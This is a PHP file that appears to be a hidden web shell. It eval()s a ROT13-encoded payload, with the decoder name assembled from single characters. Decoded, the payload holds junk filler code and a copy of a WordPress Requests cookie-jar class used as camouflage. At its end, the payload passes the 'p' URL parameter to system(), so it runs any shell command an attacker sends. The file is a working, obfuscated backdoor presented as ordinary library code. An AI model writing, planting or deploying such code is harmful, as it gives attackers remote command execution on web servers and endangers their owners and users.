<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pbbxvr ubyqre bowrpg
 *
 * @cnpxntr Erdhrfgf\Pbbxvrf
 */

anzrfcnpr JcBet\Erdhrfgf\Pbbxvr;

hfr NeenlNpprff;
hfr NeenlVgrengbe;
hfr VgrengbeNttertngr;
hfr ErgheaGlcrJvyyPunatr;
hfr JcBet\Erdhrfgf\Pbbxvr;
hfr JcBet\Erdhrfgf\Rkprcgvba;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\UbbxZnantre;
hfr JcBet\Erdhrfgf\Vev;
hfr JcBet\Erdhrfgf\Erfcbafr;

/**
 * Pbbxvr ubyqre bowrpg
 *
 * @cnpxntr Erdhrfgf\Pbbxvrf
 */
pynff Wne vzcyrzragf NeenlNpprff, VgrengbeNttertngr {
	/**
	 * Npghny vgrz qngn
	 *
	 * @ine neenl
	 */
	cebgrpgrq $pbbxvrf = [];

	/**
	 * Perngr n arj wne
	 *
	 * @cnenz neenl $pbbxvrf Rkvfgvat pbbxvr inyhrf
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg na neenl.
	 */
	choyvp shapgvba __pbafgehpg($pbbxvrf = []) {
		vs (vf_neenl($pbbxvrf) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$pbbxvrf', 'neenl', trgglcr($pbbxvrf));
		}

		$guvf->pbbxvrf = $pbbxvrf;
	}

	/**
	 * Abeznyvfr pbbxvr qngn vagb n \JcBet\Erdhrfgf\Pbbxvr
	 *
	 * @cnenz fgevat|\JcBet\Erdhrfgf\Pbbxvr $pbbxvr Pbbxvr urnqre inyhr, cbffvoyl cer-cnefrq (bowrpg).
	 * @cnenz fgevat                        $xrl    Bcgvbany. Gur anzr sbe guvf pbbxvr.
	 * @erghea \JcBet\Erdhrfgf\Pbbxvr
	 */
	choyvp shapgvba abeznyvmr_pbbxvr($pbbxvr, $xrl = '') {
		vs ($pbbxvr vafgnaprbs Pbbxvr) {
			erghea $pbbxvr;
		}

		erghea Pbbxvr::cnefr($pbbxvr, $xrl);
	}

	/**
	 * Purpx vs gur tvira vgrz rkvfgf
	 *
	 * @cnenz fgevat $bssfrg Vgrz xrl
	 * @erghea obbyrna Qbrf gur vgrz rkvfg?
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgRkvfgf($bssfrg) {
		erghea vffrg($guvf->pbbxvrf[$bssfrg]);
	}

	/**
	 * Trg gur inyhr sbe gur vgrz
	 *
	 * @cnenz fgevat $bssfrg Vgrz xrl
	 * @erghea fgevat|ahyy Vgrz inyhr (ahyy vs bssfrgRkvfgf vf snyfr)
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgTrg($bssfrg) {
		vs (!vffrg($guvf->pbbxvrf[$bssfrg])) {
			erghea ahyy;
		}

		erghea $guvf->pbbxvrf[$bssfrg];
	}

	/**
	 * Frg gur tvira vgrz
	 *
	 * @cnenz fgevat $bssfrg Vgrz anzr
	 * @cnenz fgevat $inyhr Vgrz inyhr
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba nggrzcgvat gb hfr qvpgvbanel nf yvfg (`vainyvqfrg`)
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgFrg($bssfrg, $inyhr) {
		vs ($bssfrg === ahyy) {
			guebj arj Rkprcgvba('Bowrpg vf n qvpgvbanel, abg n yvfg', 'vainyvqfrg');
		}

		$guvf->pbbxvrf[$bssfrg] = $inyhr;
	}

	/**
	 * Hafrg gur tvira urnqre
	 *
	 * @cnenz fgevat $bssfrg Gur xrl sbe gur vgrz gb hafrg.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgHafrg($bssfrg) {
		hafrg($guvf->pbbxvrf[$bssfrg]);
	}

	/**
	 * Trg na vgrengbe sbe gur qngn
	 *
	 * @erghea \NeenlVgrengbe
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba trgVgrengbe() {
		erghea arj NeenlVgrengbe($guvf->pbbxvrf);
	}

	/**
	 * Ertvfgre gur pbbxvr unaqyre jvgu gur erdhrfg'f ubbxvat flfgrz
	 *
	 * @cnenz \JcBet\Erdhrfgf\UbbxZnantre $ubbxf Ubbxvat flfgrz
	 */
	choyvp shapgvba ertvfgre(UbbxZnantre $ubbxf) {
		$ubbxf->ertvfgre('erdhrfgf.orsber_erdhrfg', [$guvf, 'orsber_erdhrfg']);
		$ubbxf->ertvfgre('erdhrfgf.orsber_erqverpg_purpx', [$guvf, 'orsber_erqverpg_purpx']);
	}

	/**
	 * Nqq Pbbxvr urnqre gb n erdhrfg vs jr unir nal
	 *
	 * Nf cre ESP 6265, pbbxvrf ner frcnengrq ol '; '
	 *
	 * @cnenz fgevat $hey
	 * @cnenz neenl $urnqref
	 * @cnenz neenl $qngn
	 * @cnenz fgevat $glcr
	 * @cnenz neenl $bcgvbaf
	 */
	choyvp shapgvba orsber_erdhrfg($hey, &$urnqref, &$qngn, &$glcr, &$bcgvbaf) {
		vs (!$hey vafgnaprbs Vev) {
			$hey = arj Vev($hey);
		}

		vs (!rzcgl($guvf->pbbxvrf)) {
			$pbbxvrf = [];
			sbernpu ($guvf->pbbxvrf nf $xrl => $pbbxvr) {
				$pbbxvr = $guvf->abeznyvmr_pbbxvr($pbbxvr, $xrl);

				// Fxvc rkcverq pbbxvrf
				vs ($pbbxvr->vf_rkcverq()) {
					pbagvahr;
				}

				vs ($pbbxvr->qbznva_zngpurf($hey->ubfg)) {
					$pbbxvrf[] = $pbbxvr->sbezng_sbe_urnqre();
				}
			}

			$urnqref['Pbbxvr'] = vzcybqr('; ', $pbbxvrf);
		}
	}

	/**
	 * Cnefr nyy pbbxvrf sebz n erfcbafr naq nggnpu gurz gb gur erfcbafr
	 *
	 * @cnenz \JcBet\Erdhrfgf\Erfcbafr $erfcbafr Erfcbafr nf erprvirq.
	 */
	choyvp shapgvba orsber_erqverpg_purpx(Erfcbafr $erfcbafr) {
		$hey = $erfcbafr->hey;
		vs (!$hey vafgnaprbs Vev) {
			$hey = arj Vev($hey);
		}

		$pbbxvrf           = Pbbxvr::cnefr_sebz_urnqref($erfcbafr->urnqref, $hey);
		$guvf->pbbxvrf     = neenl_zretr($guvf->pbbxvrf, $pbbxvrf);
		$erfcbafr->pbbxvrf = $guvf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>